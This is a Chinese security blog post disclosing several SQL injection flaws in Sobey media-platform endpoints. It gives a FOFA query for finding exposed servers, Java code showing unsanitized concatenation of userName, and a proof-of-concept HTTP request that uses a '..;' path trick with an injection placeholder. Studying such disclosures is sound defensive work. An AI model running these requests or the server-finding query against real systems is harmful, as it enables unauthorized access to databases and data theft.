---
title: "索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchjztbusiness-多个sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/19 08:32
* 653浏览
* [0评论](#comment)
* 29分钟阅读

(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/jztEditorScore/queryEditorScoreRank、userBusinessNumListDetial、countBusinessNumList接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

## queryEditorScoreRank

根据漏洞信息看下`mch/jztEditorScore/queryEditorScoreRank`的实现逻辑

```
@RestController
@RequestMapping({"/mch/Jzt/Business"})
public class JztBusinessController extends BaseController {
    private static List<Integer> ARTICLE_PUBLISH_STATUS_LIST = new ArrayList();
    private static List<Integer> ARTICLE_PUBLISH1_STATUS_LIST = new ArrayList();
    public static final String BUSSINESS_NUM_TYPE_COMPLETE = "COMPLETE_NUM";
    public static final String BUSSINESS_NUM_TYPE_USE = "USE_NUM";

@RequestMapping(
    value = {"userBusinessNumList"},
    method = {RequestMethod.POST}
)
public Response userBusinessNumList(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam("startTime") Long startTime, @RequestParam("endTime") Long endTime, @RequestParam(value = "userCodes",required = false) List<String> userCodes, @RequestParam(value = "userName",required = false) String userName) {
......
stringBuffer.append(" ) y WHERE y.idz = zcncommoneditorscore.relativeArticleId  and zcncommoneditorscore.isCoverd = 0 ");
stringBuffer.append(" and catalogname != 'other' ");
if (StringUtils.isNotEmpty(userName)) {
    try {
        URLDecoder.decode(userName, "UTF-8");
    } catch (UnsupportedEncodingException e) {
        e.printStackTrace();
    }

    stringBuffer.append(String.format(" and zcncommoneditorscore.targetUserCode in (SELECT targetUserCode from zcncommoneditorscore where targetUserName like '%%%s%%' ) ", userName));
} else if (CollectionUtils.isNotEmpty(userCodes)) {
    SchemaSQLUtil.appendInCondition(stringBuffer, "targetUserCode", userCodes);
}

stringBuffer.append(" GROUP BY userCode, ID, y.catalogname) tem GROUP BY userCode,channelName  ");
List<Map<String, Object>> tmpList = (new QueryBuilder(stringBuffer.toString(), args.toArray())).executeListMap();
```

参数`userName` 使用`String.format`格式化后，无任何过滤或校验处理，被直接拼接到qb这个sql语句中执行，从而造成了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。参数 `userCodes`使用的是`appendInCondition`方法， 参考之前的漏洞分析部分，也是直接拼接。

代码安全审计

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-001-406547fa1fe1.webp)](https://image.mrxn.net/659bd08d9aa943c8a4ec157ea2feb15c.webp)

## userBusinessNumListDetial

漏洞原因和上面的`queryEditorScoreRank` 是一样的，详情看图就明白了

漏洞修复方案

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-002-e83c9fea0cdb.webp)](https://image.mrxn.net/19ef8bc5ccd34666803015d83d335e7b.webp)

## countBusinessNumList

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)原因同样如此

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-003-d84b9975f9eb.webp)](https://image.mrxn.net/c4c389202a92444eafebc0e1c8758ac1.webp)

## countPtBusinessNumList

亦如此！

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-004-bf98ce78e7b6.webp)](https://image.mrxn.net/62efafc5619243958226c1952a33dc8e.webp)

# 漏洞复现

## userBusinessNumList

```
POST /sobey-mchEditor/js/..;/mch/Jzt/Business/userBusinessNumList HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

endTime={{timestamp()}}&siteCode=&startTime={{timestamp()}}&token=&userCode=admin&userName='SQLI_POC
```

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-005-2d23685f5071.webp)](https://image.mrxn.net/93a0a6cffeb541d3b2f085af1032bd19.webp)

成功通过报错[注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显数据库用户信息

编程

## userBusinessNumListDetial

[![索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](images/img-006-50245ccb7a4b.webp)](https://image.mrxn.net/4d5071628c0d4c969c04cda55b138804.webp)

也是成功通过[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显数据库用户信息

## countBusinessNumList

参考上面

## countPtBusinessNumList

参考上面

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.queryEditorScoreRank](#toc-4-1-)
* [4.2.userBusinessNumListDetial](#toc-4-2-)
* [4.3.countBusinessNumList](#toc-4-3-)
* [4.4.countPtBusinessNumList](#toc-4-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.userBusinessNumList](#toc-5-1-)
* [5.2.userBusinessNumListDetial](#toc-5-2-)
* [5.3.countBusinessNumList](#toc-5-3-)
* [5.4.countPtBusinessNumList](#toc-5-4-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/Jzt/Business 多个SQL注入漏洞](https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALW0lEQVR4Aeyci27jOBJFfeb//znb5TtHFkui7E73xMaCwRLX91FFhiV3nAyw/9xut6/vrK9/v3rtv/KhZ9flon3korqo/gpaI85qut+5da/q5r6DNZBfdet/n3ID20B+PQW3V1Y/uDVdn/GeB27AtjeEW9/z6jDmSodRs1asTC1IDoLdr0wtiF+v9wuiQ3Dv7V/b9xnua7aB7MX1+n03cBgIZOow4uyIkJxPgTm5qA7JQ7D7nVvX8SzXNcgeELTHLDfzu97r9WcI2R9GPMsfBnIWWtrP3cAfD6Q/LTA+BRDevyXrID4EzcHIzc989T32Gj1I7+5DdAj2PIy6fu+j/h3844F8Z9NVM7+BPx4I5KmB4OxpgWvfI8J1DuL3PESHB5rpZ+q85/Q7mhP15X8D/3ggf+MQq8fjBg4DceodHyXjq54Dbvxa6mP6wSBPsjnRBMSfcfNnaI0I6QVB9Y4QH4L6cM3NzfDsjKWd5Q8DOQst7eduYBsI5CmAa+xHg+S73nk9EbUg+XpdC8JfzfccpB7o1oHXfrWA+18HeqC8Wl2Xl1dLLsJ5P4gO12ifwm0gRdZ6/w38UxP/znp2dMhTYW/zcoiv3hHim+++XL9QbYYw9oTwnq9eteA1v7K17FOvv7vWO8Rb/BB8eSCQpwWCnt8nYcbVRUh9r4NR14foEOx9IDo80ExHe3a9c0ivnofoENSHcPvA9zhwe3kgt/X1IzfwD1xPs5/Cp0IdUg9B9VlOf4aQPhCc5dTdp7BrMPaAkVdNLetg9GHk5kQYfRi5udqjFsSv17Vg5KWtd4i39iG4fcqCcVoQ3s8J0SGoX9OtJYdzvzK1YPStm+HX19f2XxWr/ixXeq3ulVZLHbI3BNUrU+tvcfuI1buWXIScA1g/Q24f9jX9GVKTrAWZnucurdaMw5iHcAha17F6Xi3zkD5m1fcIyajByHutHMac9fqdQ/LdNydCchBUP8P1M+TsVt6obT9DXj0DjFOGcAj6tIj2lcOY04fo3+XWFbpXx/JqQfbSL22/1CE5CO4zV697fc9C+pnb++sdsr+ND3i9DeRsWnW+rndemVpdhzwF5e1Xz+mpw3mdObHnAa2naK1B4PSvv/oijLlZH0hOX7TPFW4DuQot7+duYPuUBeNUIRyCHglGri5CfJ8KEaLPcurm5ZA6dRGOOkTrtXIRkoOgPbuvLnYfUg9BffMw6voiHP31DvF2PgSnn7KcsueUi+oiZNrdh+jmZghjzj4ijL59IDqg9DLee3993X9+wKN+pttYf4bAvae+deJML3+9Q+oWPmgdBgKZrmfs04T46qJ5iC/vftch+Z6D6BC0Dkaufoa9p5mZrg/jHhBuHYSbF2HUYeTmOtq38DCQHl78Z29gOhDIdGHEmmItONfLqwXx/XZKqwXRIaj/DKu2lrl63Zfeqwi/dwa4znuevj+kTh9Gvs9PB7IPrdc/dwPb7yFOT+xHUIfz6UL0Xte5fdQ7Vxef+ZB9AUvun3CAA26BF18829s2kL3kovUinOcgOrD+e8jtw74O/2RBpuU5+3Tl3Z/pMPazToT4EFS3H5zr5vZojVrn6mL3O5/l1MVZHeTsEJzlrS88DMSihe+5gelv6v04Nb1aME4bRm4dXOvVa7+sE+G6HuJf9bBXR0ituj0geucQ3XxHOPhDxH4iJA/BfXi9Q/a38QGvDwNxiiKMU1SfnR3GvDmIPqvvulyE1NtPXb5HPUiNXNxn6zUkV69rQbj5jpWpBcnV61owcusgOgQrW0u/XrsOA9FY+J4b2AYCmR4E+3EgOozYc33qnUPqex1EhxHNzfrAmIcHn9XYU+w5dUgvecdZnTkY682LEB8euA3EJgvfewPbQJyax4FMTa7fUR+Sh2DX5dbLYcx331xHc2fYszMO53v3nrP6rvc6uTl4vt82EIsWvvcGfnsgME65H9+noqM5OK83D/Hl1s0QkgcOEeD+9yyNWU9IDoLmRYgOwVmfnpeLszpIX2D9Lev2YV+//Q75sPP/3x1n+/O735lvq8Ja6mJpteRiabUgbz91GLm6WDW1Oofrup7f9+gepBcE9cWqrSUXIfny9qv7ctGsvCOkb9eLr3dI3cIHrZcHApkqjNi/F58OSO6ZD+c56yA+BGc6xAeM3H+gw4N7NgOdqwP3Wn0In/ldh+Qh2H35Gb48kLPipf39G5j++R3G6bq1T42oLkLqnvnmzUHq1EV9sevyM7RGhOwh7zVdh+s8nPu9T9/niq93yNXtvME7DAQydc/Spw3xIWgOws1DuL66qC6qw1gH4RA0Z90er7zK6UN6QbC8qwXJQbBnIbr99eUd9WGsq9xhIIYXvucGDr+HeIyaVi25WNp+qc/QrD6MTwWE65sX1TvCWFc+jBqEQ7AyVwuSe7a3vjjrCekHQXPWieqF6x1St/BB67c/ZUGmDcFn3wskB8HbLRUQ7lMC4XFv998D4PF/Qd5z8tvu60wr+1W95+Ri9dovyJm7D9HNdl9dhOSB9cfF24d9bf9kQaY0m6a66PchF2Hsoy5aJ8KYh/Duy+0DY658OGpXenmvLEjf2d4QH4Lm7A3RIdh1eeE2kCJrvf8GDp+yYJxiPyLE9ymAcAiah2tuToQxb3/9jvp7NKMmFyF76EM4BHsOove83Hzn6jOE9D3z1zvk7FbeqE0/ZTl1yDQh2HV5/x66LhfNyzvqd4ScQx3CAaXtE5qCveXAPaMuQnRz6nIRxhxcc+vE3ldeuN4h3tKH4HQgkKnX1PYLRr1/H2YhOTjHXieHMa/eEZJzvz32rNyMHNIDgurm4Fw39yrab5aH7AOs30NuH/a1fcrqU5RDpue51eXiTNfv2PPwvX0gdfBAe4vw8IDtKPoKcmD4GaMvmpOLXZdD+pm7wuk/WVdFy/vvbuDwKcupuqUcMmUI6sM1NyfO+qmbmyGM+1m3R2vhOmtOhDE/02HMuTeMuvX6clF9j+sd4u18CG4/Q2CcLozc8zpNuQjJ64v6M64OqTcv6s+4eiFc94D4EKyaWq/uAanr+epRS12E5MurpV6vZ2u9Q2Y38yb98DPEc8ymCZk6BM2JEB2C6vaF6DP+TNfvfdXPELKnNSJEt6brEF9dhOjWQTiMqP8M4VG33iHPbuuH/cNA4DEtYDuOT4eoAdw/s8uf+eYgdeZF/c7VRUg9PNAaiCaf1ajPsNfPcl3vdZDzmINwCKoXHgZS4lrvu4HtU1Y/Qp+yPhynWh5Eh2Cvh+iVrdX90l5ZMPbZ18Dc2+eevfZskH4wov6sDyQ/860/w/UOmd3am/TtU1af1uw8s5z6szp9yFMEQfUZwphzvzO0B7xWA2PO+rPepel3LO9smYPzffQL1zukbuGD1vYzBDI9eA39HnwiIHXy7/rWQfrJe191SA5Q2tAaUQP41ifDXt/7dl/eEcb9IRxY/z3k9mFf2z9ZTvsZ9vNDpmsdhJuD8JlvTl9Uf4bmC2dZyBme+fBabtZHvc5SS96xvFrq9dq1DURz4Xtv4DAQyFMCI86O6WQhebl5OYy+ujkRkpvxrkPy8EAz4myvZz48egLGNwSGn0UQDiNa4Dng3K/cYSAlrvW+G/hrA+nT799S9yFPySynbp1cnOn6hXC9B4z+Kz2rr+vVvDnIfr0eogPrU9btw77+2jtk9n1Bpq/v0yKH0YeR91yv179CSE8Imu294Nw3J1rf8Zlv3hyM+5X/nw+kNlnr9Rs4DMTpdXzWEo7TflZTvvtA6uXlnS1IDoLmz/Csfq9BekBQz14w6jBy8zPsfeTmOy/9MJAS13rfDWwDgUwfrvF3j+pTAGPfrs+4++nLRRj7Alob9lrg/vtD1+Uw+jByc24ghzEH59y6M9wGcmYu7edvYA3k5+/8csf/AQAA//+QfoveAAAABklEQVQDAHt2fbOS2b2cAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-Jzt-Business-userBusinessNumList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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